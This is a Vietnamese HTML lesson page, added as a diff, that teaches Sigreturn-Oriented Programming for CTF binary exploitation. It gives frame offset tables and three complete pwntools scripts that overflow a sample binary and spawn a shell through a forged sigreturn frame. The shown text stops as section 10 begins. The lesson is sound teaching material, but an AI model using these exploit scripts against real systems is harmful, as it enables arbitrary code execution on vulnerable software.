@@ -1,0 +1,470 @@
+<title>SROP</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:90px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 11</div>
+    <h1>SROP</h1>
+    <p class="sub"><strong>Sigreturn-Oriented Programming</strong>: lạm dụng syscall <code>rt_sigreturn</code> (nr=15) — syscall này <mark>khôi phục TOÀN BỘ thanh ghi</mark> từ một "signal frame" trên stack. Nếu ta kiểm soát stack → dựng frame giả → <strong>set mọi thanh ghi cùng lúc</strong> chỉ với 1 gadget <code>syscall</code> + đặt được rax=15. Bài này đi <strong>byte-table frame offset thật</strong>.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 2)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 static/NX, gadget nghèo</span>
+      <span class="chip"><b>Cần trước:</b> <a href="rop_basics.html" style="color:inherit">rop_basics</a>, syscall</span>
+      <span class="chip"><b>Thời lượng:</b> ~50 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Frame</a><a href="#s4">04 Đặt rax=15</a><a href="#s5">05 Byte-table</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Cơ chế kernel:</strong> khi một signal handler xong, kernel gọi <code>sigreturn</code> để khôi phục trạng thái CPU (mọi thanh ghi + rip + rsp) từ một <mark>sigcontext frame</mark> mà kernel đã lưu trên stack.</p>
+    <p><strong>Lạm dụng:</strong> ta tự dựng frame giả trên stack, đặt <code>rax=15</code> rồi <code>syscall</code> → kernel "khôi phục" theo frame của ta → <strong>set rax, rdi, rsi, rdx, rip, rsp... tất cả cùng lúc</strong>. Thường để chạy <code>execve("/bin/sh",0,0)</code>.</p>
+    <p><strong>Khi nào:</strong> gadget quá nghèo (không có pop rdi/rsi/rdx) nhưng có <code>syscall</code> và cách đặt rax=15 + ghi được ~0xf8 byte frame.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>sigreturn set MỌI thanh ghi từ stack. rax=15 + syscall + frame giả = kiểm soát toàn bộ CPU.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🚦 Dùng khi</span>
+        <p>Gadget nghèo (không pop rsi/rdx) nhưng có <code>syscall; ret</code> và cách set <code>rax=15</code> · overflow đủ dài cho frame (~0xf8 byte) · biết địa chỉ <code>"/bin/sh"</code> &amp; <code>syscall</code> gadget.</p></div>
+      <div class="combat-row"><span class="lab">⚡ pwntools SigreturnFrame</span>
+<pre><code>frame = SigreturnFrame()
+frame.rax = 59                 <span class="c"># execve</span>
+frame.rdi = binsh
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_gadget     <span class="c"># chạy execve</span>
+frame.rsp = bss                <span class="c"># stack sau syscall (tránh crash)</span>
+payload = pad + p64(set_rax15) + p64(syscall) + bytes(frame)</code></pre></div>
+      <div class="combat-row"><span class="lab">🔢 Số quan trọng</span>
+<pre><code>rt_sigreturn = 15     execve = 59     frame = 0xf8 byte</code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 Đặt rax=15</span>
+        <p>Cách: <code>pop rax; ret → 15</code> · hoặc gọi <code>read</code> trả về số byte đọc (ép =15) · hoặc <code>syscall</code> nào trả 15 vào rax. Static thường có <code>pop rax; ret</code>.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy</span>
+        <p>frame.rip phải trỏ <code>syscall</code> (để chạy execve sau khi set rax=59). frame.rsp nên trỏ vùng hợp lệ (bss) tránh crash. cs/ss phải đúng (SigreturnFrame set sẵn).</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Signal &amp; sigreturn</h2>
+  <p>Khi tiến trình nhận signal (vd SIGSEGV), kernel <strong>lưu toàn bộ trạng thái CPU</strong> (mọi thanh ghi) vào một <span class="mem-term">sigcontext frame</span> trên stack, rồi chạy handler. Khi handler xong, nó gọi syscall <code>rt_sigreturn</code>; kernel <strong>đọc frame đó và khôi phục lại mọi thanh ghi</strong> để tiếp tục như chưa có gì. Vấn đề bảo mật: <code>sigreturn</code> <em>không kiểm tra</em> frame có phải do kernel tạo hay không — nên attacker có thể dựng frame giả.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">SROP</div><p>Lạm dụng sigreturn để set thanh ghi.</p></div>
+    <div class="card"><div class="term">sigcontext frame</div><p>Struct ~0xf8 byte chứa mọi thanh ghi.</p></div>
+    <div class="card"><div class="term">rt_sigreturn</div><p>syscall 15 — khôi phục CPU từ frame.</p></div>
+    <div class="card"><div class="term">SigreturnFrame</div><p>pwntools class dựng frame.</p></div>
+    <div class="card"><div class="term">syscall gadget</div><p>Lệnh syscall; ret.</p></div>
+    <div class="card"><div class="term">universal</div><p>Chỉ cần 1 syscall gadget → set mọi reg.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Một gadget set tất cả</h2>
+  <p>ROP thường cần nhiều gadget riêng (pop rdi, pop rsi, pop rdx...). Khi binary gadget-nghèo, điều đó bất khả. SROP đổi bài: chỉ cần <strong>một</strong> gadget <code>syscall</code> và cách đặt rax=15, bạn <em>set được toàn bộ thanh ghi trong một lần</em> — kể cả rsp, rip. Bratus &amp; nhóm (2014) chỉ ra đây là nguyên thủy cực mạnh, đặc biệt với binary nhỏ/static. Cũng dùng để <strong>stack pivot</strong> (set rsp) hay gọi mprotect.</p>
+ </div>
+</section>
+
+<!-- 03 Frame -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / FRAME · MỤC LÕI</div>
+  <h2>sigcontext frame khôi phục mọi thứ</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 620 130" role="img" aria-label="rax=15, syscall sigreturn, kernel đọc frame giả trên stack và set mọi thanh ghi, rip=syscall chạy execve" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <rect x="20" y="42" width="130" height="44" rx="8" stroke-width="1.5"/>
+    <text x="85" y="62" text-anchor="middle" font-size="11" fill="currentColor" stroke="none" font-family="monospace">rax=15; syscall</text>
+    <text x="85" y="78" text-anchor="middle" font-size="10" fill="currentColor" stroke="none" font-family="monospace">= rt_sigreturn</text>
+    <rect x="210" y="42" width="170" height="44" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="295" y="60" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">frame GIẢ (stack)</text>
+    <text x="295" y="76" text-anchor="middle" font-size="10" fill="#e8663e" stroke="none" font-family="monospace">rax=59,rdi=binsh,rip=sc</text>
+    <rect x="440" y="42" width="160" height="44" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="520" y="66" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">execve("/bin/sh")</text>
+    <line x1="150" y1="64" x2="208" y2="64" stroke-width="1.4"/>
+    <line x1="380" y1="64" x2="438" y2="64" stroke="#e8663e" stroke-width="1.5"/>
+    <text x="310" y="112" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">kernel khôi phục CPU theo frame; rip=syscall → chạy execve với rax=59 đã set.</text>
+  </svg>
+  <figcaption>sigreturn khôi phục mọi thanh ghi từ frame → ta đặt execve + rip=syscall.</figcaption>
+  </figure>
+  <h3>Luồng 2 bước</h3>
+  <div class="step"><div class="n">1</div><div class="body"><h4>rax=15 + syscall (sigreturn)</h4><p>Kernel bắt đầu đọc frame tại rsp hiện tại.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Khôi phục → chạy</h4><p>Mọi thanh ghi = giá trị trong frame; rip=syscall gadget → chạy execve (vì rax=59 trong frame).</p></div></div>
+ </div>
+</section>
+
+<!-- 04 Đặt rax -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / ĐẶT rax = 15</div>
+  <h2>Ba cách thường dùng</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>pop rax; ret → 15</h4><p>Đơn giản nhất nếu có gadget (static hay có).</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>read trả về 15</h4><p><code>read(0, buf, 15)</code> trả rax = số byte đọc = 15 nếu bạn gửi đúng 15 byte. Dùng khi không có pop rax.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>syscall sẵn có</h4><p>Một số binary có đoạn <code>mov rax,15; syscall</code> (sigreturn trampoline). Hiếm nhưng tiện.</p></div></div>
+  <div class="note tip"><span class="tag">Mẹo read</span>Trick "read trả 15" rất hay trong đề tiny-binary: gửi đúng 15 byte → rax=15 → syscall kế là sigreturn. pwntools: canh độ dài input.</div>
+ </div>
+</section>
+
+<!-- 05 Byte-table -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / BYTE-TABLE FRAME</div>
+  <h2>Offset các thanh ghi trong frame (x86-64)</h2>
+  <p>Frame (phần uc_mcontext) bắt đầu tại <code>rsp</code> khi sigreturn chạy. Các offset chính (pwntools <code>SigreturnFrame</code> tự điền; đây để hiểu &amp; forge tay):</p>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Offset</th><th>Trường</th><th>Offset</th><th>Trường</th></tr></thead>
+    <tbody>
+      <tr><td><code>+0x28</code></td><td>r8</td><td><code>+0x88</code></td><td><b>rdx</b></td></tr>
+      <tr><td><code>+0x30</code></td><td>r9</td><td><code>+0x90</code></td><td><b>rax</b></td></tr>
+      <tr><td><code>+0x38</code></td><td>r10</td><td><code>+0x98</code></td><td>rcx</td></tr>
+      <tr><td><code>+0x40</code></td><td>r11</td><td><code>+0xA0</code></td><td><b>rsp</b></td></tr>
+      <tr><td><code>+0x48</code></td><td>r12</td><td><code>+0xA8</code></td><td><b>rip</b></td></tr>
+      <tr><td><code>+0x68</code></td><td><b>rdi</b></td><td><code>+0xB0</code></td><td>eflags</td></tr>
+      <tr><td><code>+0x70</code></td><td><b>rsi</b></td><td><code>+0xB8</code></td><td>cs/gs/fs/ss</td></tr>
+      <tr><td><code>+0x78</code></td><td>rbp</td><td><code>+0xE0</code></td><td>&amp;fpstate</td></tr>
+    </tbody>
+  </table></div>
+  <h3>Frame forge tay (số thật)</h3>
+  <div class="frame">
+    <div class="fr key"><span class="o">+0x68</span><span>rdi = <code>0x4c0f43</code> (&amp;"/bin/sh")</span></div>
+    <div class="fr"><span class="o">+0x70</span><span>rsi = 0</span></div>
+    <div class="fr key"><span class="o">+0x88</span><span>rdx = 0</span></div>
+    <div class="fr key"><span class="o">+0x90</span><span>rax = 59 (execve)</span></div>
+    <div class="fr key"><span class="o">+0xA8</span><span>rip = <code>0x40137c</code> (syscall gadget)</span></div>
+    <div class="fr"><span class="o">+0xA0</span><span>rsp = bss (vùng hợp lệ sau syscall)</span></div>
+    <div class="fr"><span class="o">+0xB8</span><span>cs=0x33, ss=0x2b (SigreturnFrame set sẵn — forge tay phải đặt!)</span></div>
+  </div>
+  <div class="note warn"><span class="tag">Quên cs/ss = crash</span>Nếu forge tay mà quên <code>cs=0x33, ss=0x2b</code> → kernel từ chối/crash. pwntools <code>SigreturnFrame()</code> điền sẵn các trường segment &amp; eflags — dùng nó thay vì gõ tay.</div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>syscall gadget, rax, binsh</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>syscall gadget &amp; pop rax</h4>
+    <pre><code><span class="p">$</span> ROPgadget --binary ./a | grep -E "syscall|pop rax ; ret"</code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>"/bin/sh"</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> <span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))   <span class="c"># có sẵn? nếu không, ghi vào bss trước</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Độ dài frame</h4>
+    <pre><code><span class="c"># frame = 0xf8 byte — overflow phải đủ dài</span>
+<span class="p">&gt;&gt;&gt;</span> <span class="k">len</span>(<span class="k">bytes</span>(SigreturnFrame()))   <span class="c"># 248</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>SROP → execve("/bin/sh") (static, gadget nghèo)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -static -nostdlib ... (tiny, chỉ có syscall gadget)</span>
+<span class="c">// hoặc binary thường static gadget-nghèo. read overflow buffer.</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · SigreturnFrame</button>
+    <button class="tab" data-t="b">B · read trả 15</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — pop rax=15, syscall sigreturn, frame execve. Số thật.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF     = <span class="d">72</span>
+pop_rax = <span class="d">0x44db34</span>
+syscall = <span class="d">0x40137c</span>
+binsh   = <span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))
+
+frame = SigreturnFrame()
+frame.rax = <span class="d">59</span>              <span class="c"># execve</span>
+frame.rdi = binsh
+frame.rsi = <span class="d">0</span>
+frame.rdx = <span class="d">0</span>
+frame.rip = syscall           <span class="c"># chạy execve sau khi khôi phục</span>
+frame.rsp = exe.bss(<span class="d">0x400</span>)    <span class="c"># stack hợp lệ</span>
+
+payload  = b<span class="s">"A"</span>*OFF
+payload += p64(pop_rax) + p64(<span class="d">15</span>)   <span class="c"># rax = 15 (rt_sigreturn)</span>
+payload += p64(syscall)                 <span class="c"># gọi sigreturn → đọc frame</span>
+payload += <span class="k">bytes</span>(frame)                 <span class="c"># frame giả (0xf8 byte)</span>
+p.send(payload)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span><code>pop_rax=0x44db34</code>, <code>syscall=0x40137c</code>, <code>binsh</code> là của binary mẫu — <code>ROPgadget</code>/<code>exe.search</code>. Nếu không có "/bin/sh": dùng SROP gọi <code>read</code> ghi vào bss trước, rồi SROP thứ 2 execve(bss). <code>SigreturnFrame()</code> tự điền cs/ss/eflags.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — không có pop rax: dùng read() trả về 15 để set rax=15.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+OFF = <span class="d">72</span>; syscall = <span class="d">0x40137c</span>; binsh = <span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))
+
+frame = SigreturnFrame()
+frame.rax=<span class="d">59</span>; frame.rdi=binsh; frame.rsi=<span class="d">0</span>; frame.rdx=<span class="d">0</span>
+frame.rip=syscall; frame.rsp=exe.bss(<span class="d">0x400</span>)
+
+<span class="c"># giai đoạn 1: gọi read(0, stack, ...) — read trả số byte = rax</span>
+<span class="c"># gửi ĐÚNG 15 byte ở lần read đó → rax=15 → syscall kế = sigreturn</span>
+<span class="c"># (bố cục tùy đề; ý tưởng: ép rax=15 qua giá trị trả về của read)</span>
+<span class="c"># ... xem how2srop ...</span>
+p.send(b<span class="s">"A"</span>*OFF + p64(syscall) + <span class="k">bytes</span>(frame))
+p.send(b<span class="s">"B"</span>*<span class="d">15</span>)       <span class="c"># 15 byte → read trả 15 → rax=15</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">read trả 15</span>Đây là mẹo kinh điển cho binary KHÔNG có pop rax: lợi dụng <code>read</code> trả về số byte đọc để nạp rax=15. Canh gửi đúng 15 byte.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld + SigreturnFrame.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.arch = <span class="s">"amd64"</span>
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = start()
+OFF=<span class="d">72</span>; pop_rax=<span class="d">0x44db34</span>; syscall=<span class="d">0x40137c</span>; binsh=<span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))
+f = SigreturnFrame(); f.rax=<span class="d">59</span>; f.rdi=binsh; f.rsi=<span class="d">0</span>; f.rdx=<span class="d">0</span>; f.rip=syscall; f.rsp=exe.bss(<span class="d">0x400</span>)
+sl(b<span class="s">"A"</span>*OFF + p64(pop_rax)+p64(<span class="d">15</span>) + p64(syscall) + <span class="k">bytes</span>(f))
+ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>SigreturnFrame</code> là của pwntools (pwnld re-export). pwnld chỉ rút gọn I/O.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Crash ngay sigreturn</h4><p>Quên cs/ss (forge tay). Dùng SigreturnFrame().</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>execve không chạy</h4><p>frame.rip không trỏ syscall, hoặc rax≠59 trong frame.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>rax không thành 15</h4><p>pop rax sai / read trả ≠15. Kiểm số byte gửi.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">pwntools SigreturnFrame</div><h4>Dựng frame</h4><p>Tự điền cs/ss/eflags.</p></div>
+    <div class="card"><div class="term">ROPgadget</div><h4>syscall/pop rax</h4><p>Tìm gadget tối thiểu.</p></div>
+    <div class="card"><div class="term">gdb</div><h4>Kiểm frame</h4><p>Break tại syscall, xem reg sau sigreturn.</p></div>
+    <div class="card"><div class="term">how2srop</div><h4>POC</h4><p>Các biến thể SROP.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi SROP không chạy</h2>
+  <div class="grid">
+    <div class="card"><h4>Crash tại sigreturn</h4><p>cs/ss/eflags sai. Dùng SigreturnFrame().</p></div>
+    <div class="card"><h4>rax≠15</h4><p>pop rax sai hoặc read trả khác. Kiểm độ dài.</p></div>
+    <div class="card"><h4>rip không phải syscall</h4><p>execve không trigger. frame.rip = syscall gadget.</p></div>
+    <div class="card"><h4>rsp xấu</h4><p>Sau execve/nếu fail, rsp trỏ vùng lỗi. Đặt frame.rsp = bss.</p></div>
+    <div class="card"><h4>Overflow không đủ</h4><p>Frame 0xf8 byte. Cần buffer/read dài.</p></div>
+    <div class="card"><h4>Không có /bin/sh</h4><p>SROP read ghi bss trước, rồi SROP execve(bss).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
